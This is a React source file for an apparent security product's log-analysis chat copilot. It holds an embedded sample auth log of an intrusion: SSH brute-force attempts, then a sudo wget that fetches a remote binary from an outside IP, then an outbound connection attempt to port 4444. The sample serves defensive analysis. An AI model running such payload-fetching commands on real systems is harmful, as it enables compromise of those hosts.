import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { Bot, Send, Sparkles, User, FileText, Loader2 } from "lucide-react";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/app/chat")({
  head: () => ({
    meta: [
      { title: "Log Analysis Copilot — DriftGuard" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: ChatPage,
});

type Msg = { role: "user" | "assistant"; content: string };

const SAMPLE_LOG = `Nov 12 03:14:22 web-01 sshd[2841]: Failed password for root from 185.220.101.44 port 42112 ssh2
Nov 12 03:14:24 web-01 sshd[2843]: Failed password for root from 185.220.101.44 port 42118 ssh2
Nov 12 03:14:26 web-01 sshd[2845]: Failed password for admin from 185.220.101.44 port 42124 ssh2
Nov 12 03:14:31 web-01 sshd[2851]: Accepted password for ubuntu from 185.220.101.44 port 42140 ssh2
Nov 12 03:14:44 web-01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/wget http://45.9.148.99/x86
Nov 12 03:14:58 web-01 kernel: [UFW BLOCK] SRC=10.0.0.14 DST=45.9.148.99 DPT=4444`;

const SUGGESTIONS = [
  "Summarize suspicious activity in the last hour",
  "Correlate failed logins with lateral movement",
  "Identify likely MITRE ATT&CK techniques",
  "What should I do next to contain this?",
];

function ChatPage() {
  const [messages, setMessages] = useState<Msg[]>([]);
  const [input, setInput] = useState("");
  const [logs, setLogs] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight, behavior: "smooth" });
  }, [messages, busy]);

  async function send(text: string, logOverride?: string) {
    const q = text.trim();
    if (!q || busy) return;
    setError(null);
    const next: Msg[] = [...messages, { role: "user", content: q }];
    setMessages(next);
    setInput("");
    setBusy(true);
    setMessages((m) => [...m, { role: "assistant", content: "" }]);

    try {
      const res = await fetch("/api/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ messages: next, logs: logOverride ?? logs }),
      });
      if (!res.ok || !res.body) {
        const t = await res.text().catch(() => "");
        throw new Error(t || `Request failed (${res.status})`);
      }
      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      let acc = "";
      let buffer = "";
      while (true) {
        const { value, done } = await reader.read();
        if (done) break;
        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split("\n");
        buffer = lines.pop() ?? "";
        for (const line of lines) {
          const l = line.trim();
          if (!l.startsWith("data:")) continue;
          const payload = l.slice(5).trim();
          if (payload === "[DONE]") continue;
          try {
            const j = JSON.parse(payload);
            const delta = j.choices?.[0]?.delta?.content ?? "";
            if (delta) {
              acc += delta;
              setMessages((m) => {
                const copy = [...m];
                copy[copy.length - 1] = { role: "assistant", content: acc };
                return copy;
              });
            }
          } catch {
            /* ignore keepalive */
          }
        }
      }
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Something went wrong";
      setError(msg);
      setMessages((m) => m.slice(0, -1));
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="flex h-[calc(100vh-8rem)] min-h-0 gap-4 p-4 md:p-6">
      {/* Log context panel */}
      <aside className="hidden w-80 shrink-0 flex-col rounded-lg border border-border bg-panel/50 lg:flex">
        <div className="flex items-center gap-2 border-b border-border p-3">
          <FileText className="h-4 w-4 text-primary" />
          <div className="text-sm font-semibold">Log context</div>
          <button
            onClick={() => setLogs(SAMPLE_LOG)}
            className="ml-auto text-[11px] font-mono-tech text-muted-foreground hover:text-foreground"
          >
            load sample
          </button>
        </div>
        <textarea
          value={logs}
          onChange={(e) => setLogs(e.target.value)}
          placeholder="Paste system, auth, network or app logs here… The copilot will analyse them alongside your question."
          className="flex-1 resize-none bg-transparent p-3 text-[12px] font-mono-tech text-foreground/90 placeholder:text-muted-foreground focus:outline-none"
        />
        <div className="border-t border-border p-2 text-[10px] font-mono-tech text-muted-foreground">
          {logs ? `${logs.length.toLocaleString()} chars attached` : "no log attached · analyst-only session"}
        </div>
      </aside>

      {/* Chat column */}
      <section className="flex min-w-0 flex-1 flex-col rounded-lg border border-border bg-panel/30">
        <header className="flex items-center gap-2 border-b border-border px-4 py-3">
          <div className="grid h-8 w-8 place-items-center rounded-md bg-primary/15 ring-1 ring-primary/40">
            <Sparkles className="h-4 w-4 text-primary" />
          </div>
          <div className="min-w-0">
            <div className="text-sm font-semibold">Log Analysis Copilot</div>
            <div className="text-[11px] font-mono-tech text-muted-foreground">
              gemini-2.5-flash · streaming · SOC-tuned prompt
            </div>
          </div>
          <span className="ml-auto inline-flex items-center gap-1.5 rounded-md border border-border bg-background/60 px-2 py-1 text-[10px] font-mono-tech text-muted-foreground">
            <span className="h-1.5 w-1.5 rounded-full bg-ok" />
            live
          </span>
        </header>

        <div ref={scrollRef} className="flex-1 space-y-4 overflow-y-auto p-4">
          {messages.length === 0 && (
            <div className="mx-auto max-w-lg space-y-4 py-8 text-center">
              <Bot className="mx-auto h-8 w-8 text-primary" />
              <div>
                <div className="text-sm font-semibold">Ask the copilot to analyse logs</div>
                <p className="mt-1 text-[12px] text-muted-foreground">
                  Paste logs on the left, or click a suggestion to try the sample.
                </p>
              </div>
              <div className="grid gap-2 sm:grid-cols-2">
                {SUGGESTIONS.map((s) => (
                  <button
                    key={s}
                    onClick={() => {
                      const l = logs || SAMPLE_LOG;
                      if (!logs) setLogs(l);
                      send(s, l);
                    }}
                    className="rounded-md border border-border bg-panel px-3 py-2 text-left text-[12px] hover:border-primary/50 hover:bg-accent"
                  >
                    {s}
                  </button>
                ))}
              </div>
            </div>
          )}

          {messages.map((m, i) => (
            <div key={i} className={cn("flex gap-3", m.role === "user" ? "justify-end" : "justify-start")}>
              {m.role === "assistant" && (
                <div className="mt-0.5 grid h-7 w-7 shrink-0 place-items-center rounded-md bg-primary/15 ring-1 ring-primary/40">
                  <Bot className="h-3.5 w-3.5 text-primary" />
                </div>
              )}
              <div
                className={cn(
                  "max-w-[80%] whitespace-pre-wrap rounded-lg px-3 py-2 text-[13px] leading-relaxed",
                  m.role === "user"
                    ? "bg-primary text-primary-foreground"
                    : "border border-border bg-background/60",
                )}
              >
                {m.content || (busy && i === messages.length - 1 ? (
                  <span className="inline-flex items-center gap-2 text-muted-foreground">
                    <Loader2 className="h-3.5 w-3.5 animate-spin" /> analysing…
                  </span>
                ) : null)}
              </div>
              {m.role === "user" && (
                <div className="mt-0.5 grid h-7 w-7 shrink-0 place-items-center rounded-md bg-panel ring-1 ring-border">
                  <User className="h-3.5 w-3.5" />
                </div>
              )}
            </div>
          ))}

          {error && (
            <div className="rounded-md border border-critical/40 bg-critical/10 p-3 text-[12px] text-critical">
              {error}
            </div>
          )}
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            send(input);
          }}
          className="border-t border-border p-3"
        >
          <div className="flex items-end gap-2 rounded-md border border-border bg-background/60 p-2 focus-within:border-primary/50">
            <textarea
              value={input}
              onChange={(e) => setInput(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter" && !e.shiftKey) {
                  e.preventDefault();
                  send(input);
                }
              }}
              rows={1}
              placeholder="Ask: 'What's suspicious in these logs?' or 'Map to MITRE ATT&CK'…"
              className="max-h-40 min-h-[24px] flex-1 resize-none bg-transparent text-[13px] placeholder:text-muted-foreground focus:outline-none"
            />
            <button
              type="submit"
              disabled={busy || !input.trim()}
              className="inline-flex items-center gap-1.5 rounded-md bg-primary px-3 py-1.5 text-[12px] font-medium text-primary-foreground disabled:opacity-50"
            >
              {busy ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Send className="h-3.5 w-3.5" />}
              Send
            </button>
          </div>
          <div className="mt-1.5 flex items-center justify-between text-[10px] font-mono-tech text-muted-foreground">
            <span>Enter to send · Shift+Enter for newline</span>
            <span>{logs ? "log context attached" : "no log context"}</span>
          </div>
        </form>
      </section>
    </div>
  );
}
